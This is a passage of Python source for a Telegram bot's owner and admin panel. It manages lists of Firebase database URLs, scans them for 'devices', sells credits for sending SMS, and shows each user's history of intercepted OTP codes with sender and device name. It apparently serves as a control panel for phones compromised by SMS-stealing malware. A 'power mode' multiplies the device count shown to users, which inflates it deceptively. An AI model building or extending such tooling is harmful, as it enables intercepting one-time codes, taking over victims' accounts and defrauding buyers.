@R.callback_query(F.data == "user:tpl:new")
async def user_tpl_new(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.template_name)
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>New Template</b>\n\nName:",
        kb([(sc("cancel"), "user:templates:menu")]),
    )

@R.message(S.template_name)
async def tpl_name(m: Message, state: FSMContext):
    name = (m.text or "").strip()[:40]
    if not name:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.update_data(tpl_name=name)
    await state.set_state(S.template_text)
    await m.answer(f"Name saved: <b>{esc(name)}</b>\n\nEnter template text:", parse_mode="HTML")

@R.message(S.template_text)
async def tpl_text(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    txt = (m.text or "").strip()[:500]
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    name = fsmd.get("tpl_name", "tpl")
    await state.clear()
    d.setdefault("templates", {}).setdefault(str(uid), []).append({
        "name": name,
        "text": txt,
        "created_at": now_ts(),
    })
    save()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Template saved: <b>{esc(name)}</b>",
        reply_markup=kb([(sc("templates"), "user:templates:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^user:tpl:use:(\d+)$"))
async def user_tpl_use(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        await cq.answer()
    except Exception:
        pass
    i = int(cq.data.split(":")[-1])
    tpls = d.get("templates", {}).get(str(uid), [])
    if i >= len(tpls):
        return
    tpl = tpls[i]
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Template</b>\n\n"
        f"<b>{esc(tpl['name'])}</b>\n\n"
        f"<code>{esc(tpl['text'])}</code>",
        kb([
            (sc("copy"), "noop"),
            (sc("back"), "user:templates:menu"),
        ]),
    )

# ═══════════════════════════════════════════════════════════
#  END OF PART 4  —  paste PART 5 right after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 5 START — OWNER FLOWS / FIREBASE / FORCE JOIN / SETTINGS
# ============================================================

# ============================================================
#  POWER MODE
# ============================================================
@R.callback_query(F.data.startswith("owner:set_power:"))
async def set_power(cq: CallbackQuery, state: FSMContext):
    global CURRENT_POWER_MODE, LAST_KNOWN_DEVICE_COUNT
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        mult = int(cq.data.split("owner:set_power:", 1)[1])
        if mult not in ALLOWED_POWER_MODES:
            raise ValueError
    except Exception:
        try:
            await cq.answer("❌ Invalid")
        except Exception:
            pass
        return
    CURRENT_POWER_MODE = mult
    real = len(CACHED_DEVICES)
    if real > 0:
        LAST_KNOWN_DEVICE_COUNT = real * mult
    try:
        await cq.answer(f"⚡ Power: {mult}x")
    except Exception:
        pass
    log_audit(d, "power_change", cq.from_user.id, f"{mult}x")
    save()
    await safe_edit(cq, owner_panel_text(d), owner_kb(d))
    uid = cq.from_user.id
    _OWNER_PANEL_STATE[uid] = {
        "chat_id": cq.message.chat.id,
        "msg_id": cq.message.message_id,
        "active": True,
        "last_user_action": time.time(),
    }

# ============================================================
#  MAINTENANCE TOGGLE
# ============================================================
@R.callback_query(F.data == "owner:toggle_maint")
async def maint_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    cur = d.setdefault("settings", {}).get("maintenance", False)
    d["settings"]["maintenance"] = not cur
    log_audit(d, "maint_toggle", cq.from_user.id, f"{d['settings']['maintenance']}")
    save()
    try:
        await cq.answer(f"🔧 {'ON' if d['settings']['maintenance'] else 'OFF'}")
    except Exception:
        pass
    await safe_edit(cq, owner_panel_text(d), owner_kb(d))

# ============================================================
#  EDIT OWNER NAME
# ============================================================
@R.callback_query(F.data == "owner:edit_name")
async def edit_name_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.owner_edit_name)
    cur = get_owner_display(d) or "<i>(hidden)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '✏️')} <b>Edit Owner Name</b>\n\n"
        f"Current: <b>{cur}</b>\n\n"
        f"• Send text → set\n"
        f"• Send <code>null</code> → hide\n"
        f"• Send <code>cancel</code> → back",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.owner_edit_name)
async def edit_name_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    raw = (m.text or "").strip()
    low = raw.lower()
    if low in ("cancel", "/cancel"):
        await state.clear()
        await m.answer("❌ Cancelled.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if low in ("null", "none", "hide", "-", "0"):
        d.setdefault("settings", {})["owner_display"] = None
        save()
        await state.clear()
        await m.answer(f"✅ <b>Hidden!</b>", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if not raw:
        await m.answer(f"❌ Use <code>null</code> to hide.", parse_mode="HTML")
        return
    val = raw[:64]
    d.setdefault("settings", {})["owner_display"] = val
    log_audit(d, "owner_name_change", m.from_user.id, val)
    save()
    await state.clear()
    await m.answer(f"✅ Updated: <b>{esc(val)}</b>", reply_markup=owner_kb(d), parse_mode="HTML")

# ============================================================
#  FIREBASE MENU
# ============================================================
@R.callback_query(F.data.startswith("owner:fb:menu"))
async def fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    await state.clear()
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await safe_edit(
        cq,
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"Total: <b>{len(d.get('firebases', []))}</b>",
        fb_menu_kb(d, page),
    )

# ============================================================
#  FIREBASE ADD — single
# ============================================================
@R.callback_query(F.data == "owner:fb:add")
async def fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_firebase)
    await safe_edit(
        cq,
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
        f"Format:\n"
        f"• <code>Label | URL</code>\n"
        f"• Or just URL\n\n"
        f"Example:\n"
        f"<code>Mumbai-1 | https://xyz.firebaseio.com</code>",
        kb([(sc("cancel"), "owner:fb:menu:0")]),
    )

@R.message(S.add_firebase)
async def fb_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip()
    if "|" in txt:
        parts = txt.split("|", 1)
        label, url = parts[0].strip(), parts[1].strip()
    else:
        url = txt
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await m.answer(f"❌ URL must start with http.", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await m.answer(f"⚠️ Already exists!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    # validate
    ok, note = await check_firebase_url(url)
    if not ok:
        await m.answer(
            f"❌ <b>Firebase check failed</b>\n\n"
            f"URL: <code>{esc(url)}</code>\n"
            f"Reason: <code>{esc(note)}</code>",
            parse_mode="HTML",
        )
        return
    fid = str(int(time.time() * 1000))
    existing = {fb["id"] for fb in fbs}
    while fid in existing:
        fid = str(int(time.time() * 1000) + random.randint(1000, 9999))
    fbs.append({
        "id": fid,
        "url": url,
        "label": label[:30],
        "added_at": now_ts(),
    })
    d["firebases"] = fbs
    log_audit(d, "fb_add", m.from_user.id, f"{label} {url}")
    save()
    await state.clear()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Added!\n\n"
        f"📛 {esc(label)}\n"
        f"🔗 <code>{esc(url)}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML",
    )

# ============================================================
#  FIREBASE ADD — file
# ============================================================
@R.callback_query(F.data == "owner:fb:add_file")
async def fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_firebase_file)
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📄')} <b>Add via File</b>\n\n"
        f"Send any file with firebase URLs.\n"
        f"Supported: <code>.txt</code> <code>.json</code> <code>.csv</code> "
        f"<code>.log</code> <code>.md</code> <code>.html</code> <code>.xml</code> — or any\n\n"
        f"📁 Multi-file supported (3s batch)\n"
        f"🔍 URLs auto-detected\n"
        f"✅ Each URL validated before add",
        kb([(sc("cancel"), "owner:fb:menu:0")]),
    )

# ============================================================
#  FIREBASE ADD — bulk multi-file
# ============================================================
@R.callback_query(F.data == "owner:fb:add_multi")
async def fb_add_multi_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_firebase_file)
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📁')} <b>Bulk Import</b>\n\n"
        f"Send multiple files at once.\n"
        f"Bot collects files for 3s, then processes all.\n\n"
        f"⏱ Auto-processes 3s after last file.",
        kb([(sc("cancel"), "owner:fb:menu:0")]),
    )

@R.message(S.add_firebase_file, F.document)
async def fb_add_file_doc(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    doc = m.document
    fname = doc.file_name or "unknown"
    content = ""
    try:
        fi = await m.bot.get_file(doc.file_id)
        downloaded = await m.bot.download_file(fi.file_path)
        raw = downloaded.read() if hasattr(downloaded, "read") else downloaded
        try:
            content = raw.decode("utf-8", errors="ignore")
        except Exception:
            try:
                content = raw.decode("latin-1", errors="ignore")
            except Exception:
                content = ""
    except Exception as e:
        try:
            await m.answer(f"❌ Read failed: {esc(str(e)[:60])}", parse_mode="HTML")
        except Exception:
            pass
        return

    uid = m.from_user.id
    b = _FB_UPLOAD_BATCH.get(uid)
    if not b:
        b = {"files": [], "task": None, "chat_id": m.chat.id}
        _FB_UPLOAD_BATCH[uid] = b
    b["files"].append((fname, content))
    b["chat_id"] = m.chat.id

    if b.get("task") and not b["task"].done():
        b["task"].cancel()

    urls_in_file = extract_urls(content)
    try:
        await m.answer(
            f"{em(EMOJI_FILE, '📄')} <b>File received</b>\n"
            f"📛 <code>{esc(fname[:40])}</code>\n"
            f"📦 {len(content)} bytes\n"
            f"🔗 URLs: <b>{len(urls_in_file)}</b>\n\n"
            f"📁 Queue: <b>{len(b['files'])}</b>\n"
            f"<i>Send more files or wait 3s.</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    b["task"] = asyncio.create_task(_fb_batch_worker(m.bot, uid))

@R.message(S.add_firebase_file)
async def fb_add_file_other(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    if m.text:
        urls = extract_urls(m.text)
        if urls:
            uid = m.from_user.id
            b = _FB_UPLOAD_BATCH.get(uid)
            if not b:
                b = {"files": [], "task": None, "chat_id": m.chat.id}
                _FB_UPLOAD_BATCH[uid] = b
            b["files"].append((f"text_{int(time.time())}", m.text))
            b["chat_id"] = m.chat.id
            if b.get("task") and not b["task"].done():
                b["task"].cancel()
            try:
                await m.answer(f"📝 Text added ({len(urls)} URLs). Queue: {len(b['files'])}")
            except Exception:
                pass
            b["task"] = asyncio.create_task(_fb_batch_worker(m.bot, uid))
            return
    try:
        await m.answer(f"❌ Send a file or text with URLs.", parse_mode="HTML")
    except Exception:
        pass

# ============================================================
#  FIREBASE DELETE
# ============================================================
@R.callback_query(F.data.startswith("owner:fb:del:"))
async def fb_del(cq: CallbackQuery, state: FSMContext):
    global CACHED_DEVICES, FB_DEVICE_COUNTS, LAST_KNOWN_FB_COUNTS
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    parts = cq.data.split(":")
    fid = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fid]
    log_audit(d, "fb_del", cq.from_user.id, fid)
    save()
    CACHED_DEVICES = [x for x in CACHED_DEVICES if x.get("fb_id") != fid]
    FB_DEVICE_COUNTS.pop(fid, None)
    LAST_KNOWN_FB_COUNTS.pop(fid, None)
    FB_SCAN_ERRORS.pop(fid, None)
    try:
        await cq.answer("🗑 Removed!")
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"Total: <b>{len(d['firebases'])}</b>",
        fb_menu_kb(d, page),
    )

# ============================================================
#  FIREBASE HEALTH
# ============================================================
@R.callback_query(F.data == "owner:fbhealth")
async def fb_health(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    txt = _firebase_health_text(d)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(
        cq,
        txt,
        kb([
            (sc("refresh"), "owner:fbhealth"),
            (sc("back"), "owner:home"),
        ]),
    )

# ============================================================
#  API STATS (owner / admin)
# ============================================================
def _api_stats(d):
    stats = d.get("stats", {})
    api = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_CHART, '📊')} <b>API Stats</b>\n",
        f"📤 Sent: <b>{stats.get('total_sent', 0)}</b>",
        f"❌ Failed: <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    if not api:
        lines.append("  😴 No usage.")
    for fid, s in list(api.items())[:20]:
        fb = fbs.get(fid)
        lbl = esc(fb.get("label", fid[:20]) if fb else fid[:20])
        lines.append(
            f"🔥 {lbl}\n"
            f"   ✅ {s.get('sent', 0)} | ❌ {s.get('failed', 0)}"
        )
    return "\n".join(lines)

@R.callback_query(F.data.in_({"owner:stats", "admin:stats"}))
async def stats_any(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    is_o = is_owner(uid, d)
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("⏳")
    except Exception:
        pass
    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
    if not devices:
        try:
            devices = await scan_all(d)
        except Exception:
            devices = []
    txt = _api_stats(d)
    dl = [f"\n{em(EMOJI_CHECK, '🟢')} <b>APIs ({len(devices) * CURRENT_POWER_MODE})</b>\n"]
    if not devices:
        dl.append("  😴 None")
    for dv in devices[:30]:
        dl.append(
            f"  📱 {esc(str(dv.get('dev_name', ''))[:20])} — "
            f"🔥 {esc(str(dv.get('fb_label', ''))[:20])}"
        )
    if len(devices) > 30:
        dl.append(f"  ...+{len(devices) - 30}")
    full = txt + "\n" + "\n".join(dl)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...</i>"
    back = "owner:home" if is_o else "admin:home"
    prefix = "owner" if is_o else "admin"
    await safe_edit(
        cq,
        full,
        kb([
            (sc("refresh"), f"{prefix}:stats"),
            (sc("back"), back),
        ]),
    )

# ============================================================
#  USERS LIST
# ============================================================
def _users_list(d, prefix, page=0):
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    appr = d.get("approved", [])
    ban = d.get("banned", [])
    lines = [f"{em(EMOJI_USER, '👥')} <b>Users ({len(items)})</b>\n"]
    for us, ud in chunk:
        uid = int(us)
        nm = esc(str(ud.get("name", "?"))[:16])
        st = "🚫" if uid in ban else "✅" if uid in appr else "👑" if is_owner(uid, d) else "🛡" if uid in d.get("admins", []) else "👤"
        lines.append(
            f"{st} <b>{nm}</b> — 💰{ud.get('credits', 0)} "
            f"🪙{ud.get('coins', 0)} 📤{ud.get('uses', 0)}"
        )
    rows = []
    for us, ud in chunk:
        uid = int(us)
        nm = str(ud.get("name", "?"))[:22]
        rows.append([btn(f"{nm} • {uid}", f"{prefix}:user:view:{uid}", EMOJI_USER, "👤")])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"{prefix}:users:pg:{page - 1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items):
        nav.append(btn("next", f"{prefix}:users:pg:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    txt, mk = _users_list(d, prefix, 0)
    await safe_edit(cq, txt, mk)

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    txt, mk = _users_list(d, parts[0], int(parts[3]))
    await safe_edit(cq, txt, mk)

# ============================================================
#  USER DETAIL
# ============================================================
def _user_detail(d, uid):
    k = str(uid)
    ud = d.get("users", {}).get(k, {})
    nm = esc(str(ud.get("name", "?"))[:40])
    role = role_tag(uid, d)
    credits = ud.get("credits", 0)
    coins = ud.get("coins", 0)
    uses = ud.get("uses", 0)
    otp_uses = ud.get("otp_uses", 0)
    joined = fmt_time(ud.get("joined_at", 0))
    last_active = fmt_age(ud.get("last_active", 0))
    lim = get_user_send_limit(uid, d)
    olim = get_user_otp_limit(uid, d)
    lim_s = "unlimited" if lim is None else ("BLOCKED" if lim <= 0 else str(lim))
    olim_s = "unlimited" if olim is None else ("BLOCKED" if olim <= 0 else str(olim))
    note = esc(str(d.get("user_notes", {}).get(k, ""))[:100])
    ban_r = esc(str(d.get("ban_reasons", {}).get(k, ""))[:100])
    tags = d.get("user_tags", {}).get(k, [])
    tags_s = " ".join(f"#{esc(t)}" for t in tags[:5]) if tags else ""
    referred = len(d.get("referral_tree", {}).get(k, []))
    txt = (
        f"{em(EMOJI_USER, '👤')} <b>User Details</b>\n\n"
        f"🆔 <code>{uid}</code>\n"
        f"👤 <b>{nm}</b>\n"
        f"{role}\n"
    )
    if tags_s:
        txt += f"{em(EMOJI_TAG, '🏷')} {tags_s}\n"
    txt += (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_COIN, '🪙')} ᴄᴏɪɴs   : <b>{coins}</b>\n"
        f"{em(EMOJI_STAR, '📤')} sᴍs ᴜsᴇs: <b>{uses}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ᴜsᴇs: <b>{otp_uses}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} sᴍs ʟɪᴍ: <b>{lim_s}</b>\n"
        f"{em(EMOJI_LOCK, '🔐')} ᴏᴛᴘ ʟɪᴍ: <b>{olim_s}</b>\n"
        f"{em(EMOJI_CLOCK, '📅')} ᴊᴏɪɴᴇᴅ  : <b>{joined}</b>\n"
        f"{em(EMOJI_CLOCK, '🕐')} ʟᴀsᴛ   : <b>{last_active}</b>\n"
        f"{em(EMOJI_USER, '👥')} ʀᴇғᴇʀs  : <b>{referred}</b>\n"
    )
    if note:
        txt += f"\n📝 <b>Note:</b> {note}"
    if ban_r:
        txt += f"\n🚫 <b>Ban:</b> {ban_r}"
    return txt

def _user_detail_kb(uid, d, prefix):
    rows = [
        [
            btn("add credits", f"{prefix}:u:addcr:{uid}", EMOJI_PLUS, "💰", style="success"),
            btn("add coins", f"{prefix}:u:addcoin:{uid}", EMOJI_PLUS, "🪙", style="success"),
        ],
        [
            btn("deduct credits", f"{prefix}:u:dedcr:{uid}", EMOJI_MINUS, "💰", style="danger"),
            btn("deduct coins", f"{prefix}:u:dedcoin:{uid}", EMOJI_MINUS, "🪙", style="danger"),
        ],
        [btn("send message", f"{prefix}:u:msg:{uid}", EMOJI_BELL, "📩", style="primary")],
        [
            btn("sms history", f"{prefix}:u:smshist:{uid}", EMOJI_CLOCK, "📜", style="primary"),
            btn("otp history", f"{prefix}:u:otphist:{uid}", EMOJI_OTP, "🔐", style="primary"),
        ],
        [
            btn("edit note", f"{prefix}:u:note:{uid}", EMOJI_GEAR, "📝", style="primary"),
            btn("edit tags", f"{prefix}:u:tags:{uid}", EMOJI_TAG, "🏷", style="primary"),
        ],
        [
            btn("sms limit", f"{prefix}:u:lim:{uid}", EMOJI_LOCK, "🔒", style="primary"),
            btn("otp limit", f"{prefix}:u:otplim:{uid}", EMOJI_LOCK, "🔐", style="primary"),
        ],
        [
            btn("toggle premium", f"{prefix}:u:premium:{uid}", EMOJI_STAR, "💎", style="primary"),
        ],
        [
            btn("tx history", f"{prefix}:u:txhist:{uid}", EMOJI_CHART, "📊", style="primary"),
            btn("referral tree", f"{prefix}:u:tree:{uid}", EMOJI_USER, "🌳", style="primary"),
        ],
    ]
    if uid in d.get("banned", []):
        rows.append([btn("unban user", f"{prefix}:u:unban:{uid}", EMOJI_CHECK, "✅", style="success")])
    else:
        rows.append([btn("ban user", f"{prefix}:u:ban:{uid}", EMOJI_CROSS, "🚫", style="danger")])
    rows.append([btn("back", f"{prefix}:users:list", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.regexp(r"^(owner|admin):user:view:(\d+)$"))
async def user_detail_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    if str(target) not in d.get("users", {}):
        try:
            await cq.answer("❌ User not found!", show_alert=True)
        except Exception:
            pass
        return
    await safe_edit(cq, _user_detail(d, target), _user_detail_kb(target, d, prefix))

# ============================================================
#  USER HISTORY (admin view)
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:smshist:(\d+)$"))
async def user_sms_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    hist = d.get("sms_history", {}).get(str(target), [])
    if not hist:
        txt = f"{em(EMOJI_CLOCK, '📜')} <b>SMS History</b>\n\nNo records."
    else:
        lines = [f"{em(EMOJI_CLOCK, '📜')} <b>SMS History</b> — <code>{target}</code>\n"]
        for i, e in enumerate(reversed(hist[-50:]), 1):
            ts = fmt_time(e.get("timestamp", 0))
            num = e.get("number", "?")
            msg = esc(str(e.get("message", ""))[:60])
            st = e.get("status", "?")
            ic = "✅" if st == "sent" else "🛑" if st == "stopped" else "⏳"
            lines.append(f"{i}. {ic} <code>{esc(num)}</code> [{ts}]\n   <i>{msg}</i>")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

@R.callback_query(F.data.regexp(r"^(owner|admin):u:otphist:(\d+)$"))
async def user_otp_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    hist = d.get("otp_history", {}).get(str(target), [])
    if not hist:
        txt = f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b>\n\nNo records."
    else:
        lines = [f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b> — <code>{target}</code>\n"]
        for i, e in enumerate(reversed(hist[-30:]), 1):
            ts = fmt_time(e.get("timestamp", 0))
            dev = esc(str(e.get("device_name", "?"))[:20])
            otp = e.get("otp", "?")
            sender = esc(str(e.get("sender", "?"))[:20])
            lines.append(f"{i}. 🔐 <b>{otp}</b> — {sender}\n   📱 {dev} [{ts}]")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

@R.callback_query(F.data.regexp(r"^(owner|admin):u:txhist:(\d+)$"))
async def user_tx_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    hist = d.get("transactions", {}).get(str(target), [])
    if not hist:
        txt = f"{em(EMOJI_CHART, '📊')} <b>Transactions</b>\n\nNo records."
    else:
        lines = [f"{em(EMOJI_CHART, '📊')} <b>Transactions</b> — <code>{target}</code>\n"]
        for i, e in enumerate(reversed(hist[-30:]), 1):
            ts = fmt_time(e.get("ts", 0))
            cur = e.get("currency", "?")
            delta = e.get("delta", 0)
            reason = e.get("reason", "")
            sign = "+" if delta > 0 else ""
            ic = "💰" if cur == "credits" else "🪙"
            lines.append(f"{i}. {ic} {sign}{delta} {cur} [{ts}]\n   <i>{esc(reason)[:40]}</i>")
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

@R.callback_query(F.data.regexp(r"^(owner|admin):u:tree:(\d+)$"))
async def user_tree(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    parts = cq.data.split(":")
    prefix = parts[0]
    target = int(parts[3])
    tree = d.get("referral_tree", {}).get(str(target), [])
    ud = d.get("users", {}).get(str(target), {})
    referrer = ud.get("referred_by")
    lines = [f"{em(EMOJI_USER, '🌳')} <b>Referral Tree</b> — <code>{target}</code>\n"]
    if referrer:
        rd = d.get("users", {}).get(str(referrer), {})
        lines.append(f"⬆️ Referred by: <code>{referrer}</code> ({esc(str(rd.get('name', '?'))[:20])})")
    if tree:
        lines.append(f"\n⬇️ Referred ({len(tree)}):")
        for u in tree[:30]:
            ru = d.get("users", {}).get(str(u), {})
            lines.append(f"  • <code>{u}</code> — {esc(str(ru.get('name', '?'))[:20])}")
        if len(tree) > 30:
            lines.append(f"  ...+{len(tree) - 30}")
    else:
        lines.append("\n<i>No referrals.</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), f"{prefix}:user:view:{target}")]))

# ============================================================
#  USER SEARCH
# ============================================================
@R.callback_query(F.data == "owner:users:search")
async def user_search_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.user_search)
    await safe_edit(
        cq,
        f"{em(EMOJI_SEARCH, '🔎')} <b>Search User</b>\n\n"
        f"Send user ID or part of name:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.user_search)
async def user_search_do(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    q = (m.text or "").strip().lower()
    await state.clear()
    if not q:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    matches = [
        (int(us), ud)
        for us, ud in d.get("users", {}).items()
        if q in us or q in str(ud.get("name", "")).lower()
    ]
    if not matches:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} No match.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_SEARCH, '🔎')} <b>Found {len(matches)}</b>\n"]
    rows = []
    for uid, ud in matches[:15]:
        nm = esc(str(ud.get("name", "?"))[:22])
        lines.append(f"👤 {nm} — <code>{uid}</code>")
        rows.append([btn(f"{nm} • {uid}", f"owner:user:view:{uid}", EMOJI_USER, "👤")])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    await m.answer("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ============================================================
#  USER DETAIL ACTIONS
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:addcr:(\d+)$"))
